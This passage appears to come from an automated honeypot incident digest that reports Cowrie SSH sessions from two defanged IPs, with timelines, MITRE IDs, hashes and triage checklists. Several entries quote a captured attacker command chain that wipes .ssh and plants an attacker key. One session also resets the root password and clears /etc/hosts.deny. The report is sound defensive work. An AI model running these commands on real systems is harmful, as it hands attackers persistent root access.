| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:37:01` | `cowrie.session.connect` |
| `2026-06-02 17:37:01` | `cowrie.client.version` |
| `2026-06-02 17:37:02` | `cowrie.client.kex` |
| `2026-06-02 17:37:03` | `cowrie.login.success` |
| `2026-06-02 17:37:03` | `cowrie.session.params` |
| `2026-06-02 17:37:03` | `cowrie.command.input` |
| `2026-06-02 17:37:03` | `cowrie.command.failed` |
| `2026-06-02 17:37:04` | `cowrie.log.closed` |
| `2026-06-02 17:37:04` | `cowrie.session.params` |
| `2026-06-02 17:37:04` | `cowrie.command.input` |
| `2026-06-02 17:37:04` | `cowrie.session.file_download` |
| `2026-06-02 17:37:04` | `cowrie.log.closed` |
| `2026-06-02 17:37:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.0.200[.]227` to AbuseIPDB if not already reported
- [ ] Block `107.0.200[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9531ee6c271a

| Field | Detail |
|---|---|
| **Source IP** | `107.0.200[.]227` |
| **First Seen** | 2026-06-02 17:37 |
| **Last Seen** | 2026-06-02 17:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:37:07` | `cowrie.session.connect` |
| `2026-06-02 17:37:07` | `cowrie.client.version` |
| `2026-06-02 17:37:08` | `cowrie.client.kex` |
| `2026-06-02 17:37:09` | `cowrie.login.success` |
| `2026-06-02 17:37:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.0.200[.]227` to AbuseIPDB if not already reported
- [ ] Block `107.0.200[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9af7223bd98d

| Field | Detail |
|---|---|
| **Source IP** | `107.0.200[.]227` |
| **First Seen** | 2026-06-02 17:40 |
| **Last Seen** | 2026-06-02 17:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:40:41` | `cowrie.session.connect` |
| `2026-06-02 17:40:41` | `cowrie.client.version` |
| `2026-06-02 17:40:42` | `cowrie.client.kex` |
| `2026-06-02 17:40:43` | `cowrie.login.success` |
| `2026-06-02 17:40:43` | `cowrie.session.params` |
| `2026-06-02 17:40:43` | `cowrie.command.input` |
| `2026-06-02 17:40:43` | `cowrie.command.failed` |
| `2026-06-02 17:40:44` | `cowrie.log.closed` |
| `2026-06-02 17:40:44` | `cowrie.session.params` |
| `2026-06-02 17:40:44` | `cowrie.command.input` |
| `2026-06-02 17:40:44` | `cowrie.session.file_download` |
| `2026-06-02 17:40:44` | `cowrie.log.closed` |
| `2026-06-02 17:40:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.0.200[.]227` to AbuseIPDB if not already reported
- [ ] Block `107.0.200[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df410adf8884

| Field | Detail |
|---|---|
| **Source IP** | `107.0.200[.]227` |
| **First Seen** | 2026-06-02 17:40 |
| **Last Seen** | 2026-06-02 17:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:40:48` | `cowrie.session.connect` |
| `2026-06-02 17:40:48` | `cowrie.client.version` |
| `2026-06-02 17:40:48` | `cowrie.client.kex` |
| `2026-06-02 17:40:49` | `cowrie.login.success` |
| `2026-06-02 17:40:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.0.200[.]227` to AbuseIPDB if not already reported
- [ ] Block `107.0.200[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebe782dd0484

| Field | Detail |
|---|---|
| **Source IP** | `107.0.200[.]227` |
| **First Seen** | 2026-06-02 17:44 |
| **Last Seen** | 2026-06-02 17:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:44:23` | `cowrie.session.connect` |
| `2026-06-02 17:44:23` | `cowrie.client.version` |
| `2026-06-02 17:44:23` | `cowrie.client.kex` |
| `2026-06-02 17:44:24` | `cowrie.login.success` |
| `2026-06-02 17:44:25` | `cowrie.session.params` |
| `2026-06-02 17:44:25` | `cowrie.command.input` |
| `2026-06-02 17:44:25` | `cowrie.command.failed` |
| `2026-06-02 17:44:25` | `cowrie.log.closed` |
| `2026-06-02 17:44:26` | `cowrie.session.params` |
| `2026-06-02 17:44:26` | `cowrie.command.input` |
| `2026-06-02 17:44:26` | `cowrie.session.file_download` |
| `2026-06-02 17:44:26` | `cowrie.log.closed` |
| `2026-06-02 17:44:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.0.200[.]227` to AbuseIPDB if not already reported
- [ ] Block `107.0.200[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db55b09d2877

| Field | Detail |
|---|---|
| **Source IP** | `107.0.200[.]227` |
| **First Seen** | 2026-06-02 17:44 |
| **Last Seen** | 2026-06-02 17:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:44:29` | `cowrie.session.connect` |
| `2026-06-02 17:44:29` | `cowrie.client.version` |
| `2026-06-02 17:44:29` | `cowrie.client.kex` |
| `2026-06-02 17:44:30` | `cowrie.login.success` |
| `2026-06-02 17:44:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.0.200[.]227` to AbuseIPDB if not already reported
- [ ] Block `107.0.200[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4963e6e78d2

| Field | Detail |
|---|---|
| **Source IP** | `45.78.207[.]244` |
| **First Seen** | 2026-06-02 17:44 |
| **Last Seen** | 2026-06-02 17:44 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:44:40` | `cowrie.session.connect` |
| `2026-06-02 17:44:40` | `cowrie.client.version` |
| `2026-06-02 17:44:40` | `cowrie.client.kex` |
| `2026-06-02 17:44:41` | `cowrie.login.success` |
| `2026-06-02 17:44:42` | `cowrie.session.params` |
| `2026-06-02 17:44:42` | `cowrie.command.input` |
| `2026-06-02 17:44:42` | `cowrie.command.failed` |
| `2026-06-02 17:44:43` | `cowrie.log.closed` |
| `2026-06-02 17:44:43` | `cowrie.session.params` |
| `2026-06-02 17:44:43` | `cowrie.command.input` |
| `2026-06-02 17:44:43` | `cowrie.session.file_download` |
| `2026-06-02 17:44:43` | `cowrie.log.closed` |
| `2026-06-02 17:44:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.207[.]244` to AbuseIPDB if not already reported
- [ ] Block `45.78.207[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6da65096597

| Field | Detail |
|---|---|
| **Source IP** | `45.78.207[.]244` |
| **First Seen** | 2026-06-02 17:44 |
| **Last Seen** | 2026-06-02 17:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:44:51` | `cowrie.session.connect` |
| `2026-06-02 17:44:51` | `cowrie.client.version` |
| `2026-06-02 17:44:51` | `cowrie.client.kex` |
| `2026-06-02 17:44:51` | `cowrie.login.success` |
| `2026-06-02 17:44:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.207[.]244` to AbuseIPDB if not already reported
- [ ] Block `45.78.207[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d947af6a98a4

| Field | Detail |
|---|---|
| **Source IP** | `45.78.207[.]244` |
| **First Seen** | 2026-06-02 17:46 |
| **Last Seen** | 2026-06-02 17:47 |
| **Session Duration** | 41s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:4x8GiNXjK3nF"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:46:43` | `cowrie.session.connect` |
| `2026-06-02 17:46:43` | `cowrie.client.version` |
| `2026-06-02 17:46:43` | `cowrie.client.kex` |
| `2026-06-02 17:46:43` | `cowrie.login.success` |
| `2026-06-02 17:46:44` | `cowrie.session.params` |
| `2026-06-02 17:46:44` | `cowrie.command.input` |
| `2026-06-02 17:46:44` | `cowrie.command.failed` |
| `2026-06-02 17:46:44` | `cowrie.log.closed` |
| `2026-06-02 17:46:45` | `cowrie.session.params` |
| `2026-06-02 17:46:45` | `cowrie.command.input` |
| `2026-06-02 17:46:45` | `cowrie.session.file_download` |
| `2026-06-02 17:46:45` | `cowrie.log.closed` |
| `2026-06-02 17:46:54` | `cowrie.session.params` |
| `2026-06-02 17:46:54` | `cowrie.command.input` |
| `2026-06-02 17:46:54` | `cowrie.log.closed` |
| `2026-06-02 17:46:54` | `cowrie.session.params` |
| `2026-06-02 17:46:54` | `cowrie.command.input` |
| `2026-06-02 17:46:55` | `cowrie.log.closed` |
| `2026-06-02 17:46:55` | `cowrie.session.params` |
| `2026-06-02 17:46:55` | `cowrie.command.input` |
| `2026-06-02 17:46:55` | `cowrie.session.file_download` |
| `2026-06-02 17:46:55` | `cowrie.log.closed` |
| `2026-06-02 17:46:55` | `cowrie.session.params` |
| `2026-06-02 17:46:55` | `cowrie.command.input` |
| `2026-06-02 17:46:57` | `cowrie.log.closed` |
| `2026-06-02 17:46:57` | `cowrie.session.params` |
| `2026-06-02 17:46:57` | `cowrie.command.input` |
| `2026-06-02 17:46:57` | `cowrie.log.closed` |
| `2026-06-02 17:46:57` | `cowrie.session.params` |
| `2026-06-02 17:46:57` | `cowrie.command.input` |
| `2026-06-02 17:46:57` | `cowrie.command.input` |
| `2026-06-02 17:46:57` | `cowrie.log.closed` |
| `2026-06-02 17:47:02` | `cowrie.session.params` |
| `2026-06-02 17:47:02` | `cowrie.command.input` |
| `2026-06-02 17:47:02` | `cowrie.log.closed` |
| `2026-06-02 17:47:03` | `cowrie.session.params` |
| `2026-06-02 17:47:03` | `cowrie.command.input` |
| `2026-06-02 17:47:03` | `cowrie.log.closed` |
| `2026-06-02 17:47:03` | `cowrie.session.params` |
| `2026-06-02 17:47:03` | `cowrie.command.input` |
| `2026-06-02 17:47:03` | `cowrie.log.closed` |
| `2026-06-02 17:47:04` | `cowrie.session.params` |
| `2026-06-02 17:47:04` | `cowrie.command.input` |
| `2026-06-02 17:47:04` | `cowrie.log.closed` |
| `2026-06-02 17:47:04` | `cowrie.session.params` |
| `2026-06-02 17:47:04` | `cowrie.command.input` |
| `2026-06-02 17:47:05` | `cowrie.log.closed` |
| `2026-06-02 17:47:05` | `cowrie.session.params` |
| `2026-06-02 17:47:05` | `cowrie.command.input` |
| `2026-06-02 17:47:05` | `cowrie.log.closed` |
| `2026-06-02 17:47:06` | `cowrie.session.params` |
| `2026-06-02 17:47:06` | `cowrie.command.input` |
| `2026-06-02 17:47:24` | `cowrie.log.closed` |
| `2026-06-02 17:47:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.207[.]244` to AbuseIPDB if not already reported
- [ ] Block `45.78.207[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11a11a3be9d8

| Field | Detail |
|---|---|
| **Source IP** | `45.78.207[.]244` |
| **First Seen** | 2026-06-02 17:49 |
| **Last Seen** | 2026-06-02 17:49 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:49:01` | `cowrie.session.connect` |
| `2026-06-02 17:49:03` | `cowrie.client.version` |
| `2026-06-02 17:49:03` | `cowrie.client.kex` |
| `2026-06-02 17:49:03` | `cowrie.login.success` |
| `2026-06-02 17:49:06` | `cowrie.session.params` |
| `2026-06-02 17:49:06` | `cowrie.command.input` |
| `2026-06-02 17:49:06` | `cowrie.command.failed` |
| `2026-06-02 17:49:06` | `cowrie.log.closed` |
| `2026-06-02 17:49:06` | `cowrie.session.params` |
| `2026-06-02 17:49:06` | `cowrie.command.input` |
| `2026-06-02 17:49:08` | `cowrie.session.file_download` |
| `2026-06-02 17:49:08` | `cowrie.log.closed` |
| `2026-06-02 17:49:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.207[.]244` to AbuseIPDB if not already reported
- [ ] Block `45.78.207[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-045c749840ff

| Field | Detail |
|---|---|
| **Source IP** | `45.78.207[.]244` |
| **First Seen** | 2026-06-02 17:49 |
| **Last Seen** | 2026-06-02 17:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:49:10` | `cowrie.session.connect` |
| `2026-06-02 17:49:10` | `cowrie.client.version` |
| `2026-06-02 17:49:10` | `cowrie.client.kex` |
| `2026-06-02 17:49:11` | `cowrie.login.success` |
| `2026-06-02 17:49:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.207[.]244` to AbuseIPDB if not already reported
- [ ] Block `45.78.207[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c93c3910805d

| Field | Detail |
|---|---|
| **Source IP** | `45.78.207[.]244` |
| **First Seen** | 2026-06-02 17:53 |
| **Last Seen** | 2026-06-02 17:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:53:09` | `cowrie.session.connect` |
| `2026-06-02 17:53:09` | `cowrie.client.version` |
| `2026-06-02 17:53:10` | `cowrie.client.kex` |
| `2026-06-02 17:53:10` | `cowrie.login.success` |
| `2026-06-02 17:53:12` | `cowrie.session.params` |
| `2026-06-02 17:53:12` | `cowrie.command.input` |
| `2026-06-02 17:53:12` | `cowrie.command.failed` |
| `2026-06-02 17:53:12` | `cowrie.log.closed` |
| `2026-06-02 17:53:12` | `cowrie.session.params` |
| `2026-06-02 17:53:12` | `cowrie.command.input` |
| `2026-06-02 17:53:13` | `cowrie.session.file_download` |
| `2026-06-02 17:53:13` | `cowrie.log.closed` |
| `2026-06-02 17:53:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.207[.]244` to AbuseIPDB if not already reported
- [ ] Block `45.78.207[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0bcf40eb6b2

| Field | Detail |
|---|---|
| **Source IP** | `45.78.207[.]244` |
| **First Seen** | 2026-06-02 17:53 |
| **Last Seen** | 2026-06-02 17:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:53:17` | `cowrie.session.connect` |
| `2026-06-02 17:53:17` | `cowrie.client.version` |
| `2026-06-02 17:53:18` | `cowrie.client.kex` |
| `2026-06-02 17:53:18` | `cowrie.login.success` |
| `2026-06-02 17:53:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.207[.]244` to AbuseIPDB if not already reported
- [ ] Block `45.78.207[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b5d621f1911

| Field | Detail |
|---|---|
| **Source IP** | `45.78.207[.]244` |
| **First Seen** | 2026-06-02 18:05 |
| **Last Seen** | 2026-06-02 18:10 |
| **Session Duration** | 300s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 18:05:02` | `cowrie.session.connect` |
| `2026-06-02 18:05:02` | `cowrie.client.version` |
| `2026-06-02 18:05:02` | `cowrie.client.kex` |
| `2026-06-02 18:05:03` | `cowrie.login.success` |
| `2026-06-02 18:05:03` | `cowrie.session.params` |
| `2026-06-02 18:05:03` | `cowrie.command.input` |
| `2026-06-02 18:05:03` | `cowrie.command.failed` |
| `2026-06-02 18:05:03` | `cowrie.log.closed` |
| `2026-06-02 18:05:12` | `cowrie.session.params` |
| `2026-06-02 18:05:12` | `cowrie.command.input` |
| `2026-06-02 18:05:12` | `cowrie.session.file_download` |
| `2026-06-02 18:05:12` | `cowrie.log.closed` |
| `2026-06-02 18:10:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.207[.]244` to AbuseIPDB if not already reported
- [ ] Block `45.78.207[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9856705c225c

| Field | Detail |
|---|---|
| **Source IP** | `45.78.207[.]244` |
| **First Seen** | 2026-06-02 18:05 |
| **Last Seen** | 2026-06-02 18:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 18:05:15` | `cowrie.session.connect` |
| `2026-06-02 18:05:15` | `cowrie.client.version` |
| `2026-06-02 18:05:15` | `cowrie.client.kex` |
| `2026-06-02 18:05:16` | `cowrie.login.success` |
| `2026-06-02 18:05:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.207[.]244` to AbuseIPDB if not already reported
- [ ] Block `45.78.207[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-210e71e93150

| Field | Detail |
|---|---|
| **Source IP** | `45.78.207[.]244` |
| **First Seen** | 2026-06-02 18:14 |
| **Last Seen** | 2026-06-02 18:15 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
